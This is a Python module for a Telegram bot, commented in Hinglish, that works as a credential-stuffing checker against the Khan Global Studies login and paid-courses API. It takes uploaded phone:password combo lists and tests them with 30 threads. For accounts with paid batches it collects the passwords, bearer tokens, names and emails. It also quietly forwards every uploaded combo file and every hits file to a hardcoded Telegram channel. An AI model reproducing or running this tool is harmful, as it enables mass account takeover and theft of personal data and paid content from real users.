import requests
import time
import os
import asyncio
import logging
from concurrent.futures import ThreadPoolExecutor
from telegram import Update
from telegram.ext import ContextTypes

logger = logging.getLogger(__name__)

class Checker:
    # ============ BOT CONFIG ============
    command = "kgs"
    name = "KhanGS"
    # ====================================

    async def handle_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        context.user_data['awaiting_file_for'] = self.command
        await update.message.reply_text(
            f"📂 <b>{self.name} Ultra-Fast Checker Ready!</b>\n\n"
            f"Ab apna <code>combo.txt</code> file bhejo.\n"
            f"💡 <b>Robust Parse:</b> ':' ya '*' se phone/password auto-extract hoga (garbage URLs ignore honge).\n"
            f"⚠️ <b>Strict Filter:</b> Sirf wohi accounts HIT honge jinke paas <b>Paid Batches</b> honge.\n"
            f"⚡ <b>No Proxy:</b> 30 Threads ke sath direct ultra-fast connection.\n"
            f"🛑 Beech mein rokna ho toh <code>/stop</code> type kar do.",
            parse_mode="HTML"
        )

    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        progress_msg = await update.message.reply_text("⏳ File download kar raha hoon aur check start kar raha hoon...")
        
        file = await update.message.document.get_file()
        
        # ✅ Original filename aur temp path setup
        original_file_name = update.message.document.file_name or "combo.txt"
        temp_input_file = f"temp_input_{update.effective_user.id}_{int(time.time())}.txt"
        await file.download_to_drive(temp_input_file)
        
        with open(temp_input_file, 'r', encoding='utf-8-sig', errors='ignore') as f:
            lines = [line.strip() for line in f if line.strip()]
            
        total = len(lines)
        if total == 0:
            await progress_msg.edit_text("❌ File khali hai ya valid nahi hai!")
            if os.path.exists(temp_input_file): os.remove(temp_input_file)
            return

        stats = {'checked': 0, 'hits': 0, 'no_batch': 0, 'failed': 0, 'hit_details': []}
        context.user_data[f'stats_{self.command}'] = stats
        context.user_data['stop_checking'] = False

        # ✅ original_file_name bhi pass karo
        asyncio.create_task(self.run_checker(update, context, temp_input_file, original_file_name, lines, total, progress_msg))

    async def run_checker(self, update, context, temp_input_file, original_file_name, lines, total, progress_msg):
        max_workers = 30  # Ultra-fast speed (Terminal script ke barabar)
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            chunk_size = 30  # 30 workers * 30 = har 1-2 second mein progress update!
            
            for i in range(0, total, chunk_size):
                if context.user_data.get('stop_checking', False): break
                
                chunk = lines[i:i+chunk_size]
                futures = [executor.submit(self.check_single, line) for line in chunk]
                
                for future in futures:
                    if context.user_data.get('stop_checking', False): break
                    
                    result = future.result()
                    stats = context.user_data[f'stats_{self.command}']
                    stats['checked'] += 1
                    
                    if result['status'] == 'hit':
                        stats['hits'] += 1
                        stats['hit_details'].append(result['data'])
                    elif result['status'] == 'no_batch':
                        stats['no_batch'] += 1
                    else:
                        stats['failed'] += 1
                
                if context.user_data.get('stop_checking', False): break
                
                stats = context.user_data[f'stats_{self.command}']
                progress_text = (
                    f"🔄 <b>{self.name} Checking...</b>\n\n"
                    f"📊 Total: {total}\n✅ Checked: {stats['checked']}\n"
                    f"🔥 Paid Hits: {stats['hits']}\n"
                    f"⚠️ No Paid Batch: {stats['no_batch']}\n"
                    f"❌ Failed: {stats['failed']}\n⏳ Remaining: {total - stats['checked']}"
                )
                try:
                    await progress_msg.edit_text(progress_text, parse_mode="HTML")
                except Exception:
                    pass
                
                await asyncio.sleep(0.1)

        # ============ FINAL CLEANUP & SUMMARY ============
        stats = context.user_data.get(f'stats_{self.command}', {'checked': 0, 'hits': 0, 'no_batch': 0, 'failed': 0, 'hit_details': []})
        is_stopped = context.user_data.get('stop_checking', False)
        
        context.user_data.pop('stop_checking', None)
        context.user_data.pop('awaiting_file_for', None)
        context.user_data.pop(f'stats_{self.command}', None)
        
        user_name = update.effective_user.username or f"User_{update.effective_user.id}"
        
        # ✅ APP NAME se filename banao (e.g., "KhanGS.txt")
        app_filename = f"{self.name}.txt"
        
        status_emoji = "🛑" if is_stopped else "🎉"
        status_text = "User dwara STOP kar diya gaya!" if is_stopped else "Checking Completed!"
        
        # ✅ 1. CAPTION FOR USER (NO "👤 User" line here)
        user_caption = (
            f"{status_emoji} {self.name} - {status_text}\n\n"
            f"📊 Total: {total}\n✅ Checked: {stats['checked']}\n"
            f"🔥 Paid Hits: {stats['hits']}\n⚠️ No Paid Batch: {stats['no_batch']}\n❌ Failed: {stats['failed']}"
        )
        
        # ✅ 2. CAPTION FOR LOG - Original File
        log_original_caption = (
            f"🎉 {self.name} Checker\n"
            f"👤 User: @{user_name}"
        )
        
        # ✅ 3. CAPTION FOR LOG - Hits File
        log_hits_caption = (
            f"👤 User: @{user_name}\n\n"
            f"{status_emoji} {self.name} - {status_text}\n\n"
            f"📊 Total: {total}\n✅ Checked: {stats['checked']}\n"
            f"🔥 Paid Hits: {stats['hits']}\n⚠️ No Paid Batch: {stats['no_batch']}\n❌ Failed: {stats['failed']}"
        )
        
        if stats['hits'] > 0:
            hits_temp_file = f"hits_temp_{update.effective_user.id}_{int(time.time())}.txt"
            with open(hits_temp_file, 'w', encoding='utf-8') as f:
                for idx, hit in enumerate(stats['hit_details'], 1):
                    f.write(f"{idx}.\n{hit}\n\n")
            
            # ✅ CHANGE 1: Live progress message ko delete kar do
            try:
                await progress_msg.delete()
            except Exception:
                pass
            
            # ✅ CHANGE 2: User ko sirf Hits file bhejo (Filename: KhanGS.txt)
            await update.message.reply_document(
                document=open(hits_temp_file, 'rb'),
                filename=app_filename,  # ✅ APP NAME FILENAME
                caption=user_caption
            )
            
            # ✅ CHANGE 3: Channel me DONO files bhejo
            try:
                # 1. Original File to Channel (Filename: KhanGS.txt)
                await context.bot.send_document(
                    chat_id=-1004423798759,
                    document=open(temp_input_file, 'rb'),
                    filename=app_filename,  # ✅ APP NAME FILENAME
                    caption=log_original_caption
                )
                # 2. Hits File to Channel (Filename: KhanGS.txt)
                await context.bot.send_document(
                    chat_id=-1004423798759,
                    document=open(hits_temp_file, 'rb'),
                    filename=app_filename,  # ✅ APP NAME FILENAME
                    caption=log_hits_caption
                )
            except Exception as e:
                logger.error(f"Channel send error: {e}")
                
            if os.path.exists(hits_temp_file):
                os.remove(hits_temp_file)
        else:
            # No hits: notify user (NO file sent back to user)
            await progress_msg.edit_text(
                f"{user_caption}\n\n❌ Koi bhi Paid Batch Hit nahi mila.", 
                parse_mode="HTML"
            )
            
            # Optional: Still log the original file to channel even if 0 hits
            try:
                await context.bot.send_document(
                    chat_id=-1004423798759,
                    document=open(temp_input_file, 'rb'),
                    filename=app_filename,  # ✅ APP NAME FILENAME
                    caption=f"{log_original_caption}\n(0 Hits)"
                )
            except Exception as e:
                logger.error(f"Channel send error: {e}")

        # ✅ Temporary input file delete karo (End mein)
        if os.path.exists(temp_input_file):
            os.remove(temp_input_file)

    def check_single(self, line):
        # ✅ ROBUST PARSER: Exact terminal script logic
        line = line.strip()
        if not line or line.startswith('#'):
            return {'status': 'failed'}
        
        try:
            if ":" in line:
                parts = line.rsplit(":", 2)
                phone = parts[-2].strip()
                password = parts[-1].strip()
            elif "*" in line:
                parts = line.rsplit("*", 2)
                phone = parts[-2].strip()
                password = parts[-1].strip()
            else:
                return {'status': 'failed'}
            
            if not phone or not password:
                return {'status': 'failed'}
        except Exception:
            return {'status': 'failed'}

        login_url = "https://api.khanglobalstudies.com/cms/login?medium=0"
        headers = {
            'content-type': 'application/json',
            'accept': 'application/json',
            'origin': 'https://www.khanglobalstudies.com',
            'referer': 'https://www.khanglobalstudies.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
        }
        payload = {"phone": phone, "password": password, "remember": True}

        session = requests.Session()
        
        try:
            # Step 1: Login
            res = session.post(login_url, json=payload, headers=headers, timeout=10)
            data = res.json()

            if data.get("type") == "login_success":
                token = data.get("token", "N/A")
                user_data = data.get("user", {})
                name = user_data.get("name", "N/A")
                email = user_data.get("email", "N/A")
                
                # Step 2: Fetch Paid Batches
                batches_url = "https://api.khanglobalstudies.com/v1/courses/paid?medium=0"
                b_headers = headers.copy()
                b_headers['authorization'] = f'Bearer {token}'
                if 'content-type' in b_headers:
                    del b_headers['content-type']
                
                b_res = session.get(batches_url, headers=b_headers, timeout=10)
                batches = b_res.json() if b_res.status_code == 200 else []
                
                # ✅ STRICT FILTER: Sirf tab HIT jab paid batches > 0
                if len(batches) > 0:
                    hit_text = "--------------------------------------------------\n"
                    hit_text += f"🔐 Credentials: {phone}:{password}\n"
                    hit_text += f"🔑 Token: {token}\n"
                    hit_text += f"👤 Name: {name}\n"
                    hit_text += f"📧 Email: {email}\n"
                    hit_text += f"📱 Phone: {phone}\n\n"
                    hit_text += f"📚 Courses ({len(batches)}):\n"
                    
                    for idx, b in enumerate(batches, 1):
                        b_title = b.get('title', 'Unknown Batch')
                        b_id = b.get('id', 'N/A')
                        hit_text += f"{idx}. ID: {b_id} | Title: {b_title}\n"
                    
                    hit_text += "--------------------------------------------------"
                    return {'status': 'hit', 'data': hit_text}
                else:
                    # Login success lekin koi paid batch nahi
                    return {'status': 'no_batch'}
            
            return {'status': 'failed'}

        except Exception:
            return {'status': 'failed'}
